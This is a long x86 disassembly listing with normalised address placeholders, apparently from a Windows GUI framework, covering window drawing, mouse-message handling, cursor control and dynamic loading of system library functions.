mov eax [ ebx + 0x60 ]
call sub_45a684
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424fec
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_45ca20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45ca20
pop ecx
mov eax ebx
call sub_45aa58
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45aa58
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45ca20
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax ebx
call sub_45aa58
cmp eax esi
jle r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax esi
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_45cab0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45aa58
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_45a5b8
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_45aa58
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_45ca20
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45cb00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_4501b4
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4501b4
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_45cb7c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45a4b8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_45a570
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_45ab40
test eax eax
je r-xdata
mov eax esi
call sub_45a538
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_45c910
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_45ae14
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45ab40
mov edx [ ebx + 0x20 ]
call sub_45aa94
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_45cb7c
pop ecx
sub_45cbfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_45a514
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_45a514
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_45ab40
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_45cbfc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_45c910
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_45ae14
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_45a73c
mov eax edi
call sub_45ab34
test eax eax
je r-xdata
mov eax edi
call sub_45ab40
mov esi eax
mov eax esi
call sub_45aa58
push eax
mov eax esi
call sub_45a570
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_45ab34
call sub_45aa58
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_45aa58
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_45aa80
mov eax esi
call sub_45aa58
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_45aa80
mov eax edi
call sub_45ab40
call sub_45aad4
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_45a570
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_45aa80
mov eax edi
call sub_45ab34
call sub_45aad4
mov bl 0x1
jmp r-xdata
sub_45cd34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45adac
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_418420
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45b590
test eax eax
je r-xdata
push ebp
call sub_45cb7c
pop ecx
push ebp
call sub_45cbfc
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_45cb00
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_45cdbc
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi edx
mov edi eax
mov [ esp + 0xc ] 0x0
mov eax [ esi ]
cmp eax 0x204
jg r-xdata
sub eax 0x205
je r-xdata
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
cmp eax 0x201
jg r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
or cl [ r-xdata ]
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0xae2a
je r-xdata
sub eax 0x202
je r-xdata
je r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x32 ] 0x0
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0x20
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
mov [ esp + 0xc ] 0x1
mov ebp [ esi + 0x8 ]
lea eax [ ebp + 0x38 ]
push eax
lea ecx [ ebp + 0x18 ]
lea edx [ ebp + 0x28 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov eax [ esi + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
or cl [ r-xdata ]
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
jmp r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax [ edi + 0x14 ]
call sub_4503d4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
cmp [ esi + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ esi + 0x4 ]
mov eax edi
call sub_45cd34
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_4585f8
cmp eax [ esi + 0x4 ]
jne r-xdata
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x10 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_457040
test eax eax
jle r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_45b590
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esp + 0x8 ] 0x12
jne r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_444280
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
mov [ esp + 0xc ] 0x1
jmp r-xdata
sub_45d054
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov [ esp ] ebx
fild [ esp ]
fdiv [ r-xdata ]
mov [ esp + 0x4 ] esi
fild [ esp + 0x4 ]
fmulp st1
call sub_403450
pop ecx
pop edx
pop esi
pop ebx
retn
sub_45d084
push ebx
push esi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
test ebx ebx
je r-xdata
xor eax eax
mov [ esp ] esi
fild [ esp ]
mov [ esp + 0x4 ] ebx
fild [ esp + 0x4 ]
fdivp st1
fmul [ r-xdata ]
call sub_403450
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_45d0e8
push ebx
mov eax [ ecx ]
sub eax [ edx + 0x40 ]
add eax eax
sub [ ecx ] eax
mov eax [ ecx + 0x4 ]
sub eax [ edx + 0x44 ]
add eax eax
sub [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
mov ebx [ edx + 0x48 ]
sub ebx eax
mov eax ebx
add eax eax
sub [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x4 ]
mov edx [ edx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
test eax eax
jle r-xdata
pop ebx
retn
sub [ ecx + 0xc ] eax
sub_45d128
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test [ ebp - 0x1 ] 0x40
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_418420
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x8 ]
mov eax ebx
call sub_45b590
mov esi eax
test esi esi
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_418420
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x8 ]
mov eax ebx
call sub_45b590
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x12
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_418420
lea ecx [ ebp - 0x2c ]
mov edx esi
mov eax ebx
call sub_45c80c
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebx + 0x14 ]
call sub_4585f8
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
call sub_44edc0
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_451694
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x8f ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
or ecx 0xffffffff
xor edx edx
call sub_450fd0
sub_45d24c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_45a600
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_45a600
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45cab0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45cab0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_45d2dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_45c934
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_418420
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_45d24c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_45c934
sub_45d32c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
mov eax ebx
call sub_45c86c
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_418420
lea edx [ ebp - 0xc ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_45b590
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x14
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax esi
xor edx edx
call sub_4507b4
jmp r-xdata
mov eax esi
call sub_442a04
jmp r-xdata
sub_45d3a0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_45d481
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ebx eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_405530
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d488
lea eax [ ebp - 0x24 ]
call sub_405530
retn
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_4501b4
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi ]
mov eax [ ebp - 0x20 ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov edx [ ebx + 0x48 ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_450894
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
call sub_405584
mov eax [ ebp - 0xc ]
mov edi eax
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub eax 0x12
jne r-xdata
sub_45d494
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_404974
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_45d684
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_45d524
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x2c ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_45d664
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x2c ]
call [ eax + 0x2c ]
mov [ ebx + 0x28 ] eax
sub_45d550
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45d63c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_45d5a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45d5e4
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_45d614
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_4085d4
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_45d63c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45d580
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_45d664
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x28 ] esi
lea eax [ ebx + 0x28 ]
call sub_40f944
sub_45d684
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_45d5c8
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_45d5e4
pop ebx
retn
mov eax ebx
call sub_45d614
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_45d6e8
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d84e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_45d96c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45d950
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_45d950
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
movzx edx bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_45da58
mov eax [ rw-data ]
mov eax [ eax ]
call sub_404650
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_404650
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_404650
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_404650
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_405530
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_405530
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_45dae0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45dc58
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_40af98
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
call sub_4059dc
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_40af98
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
call sub_4059dc
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4059dc
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ab0
mov [ rw-data ] eax
call sub_45d6e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_45d494
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_443b58
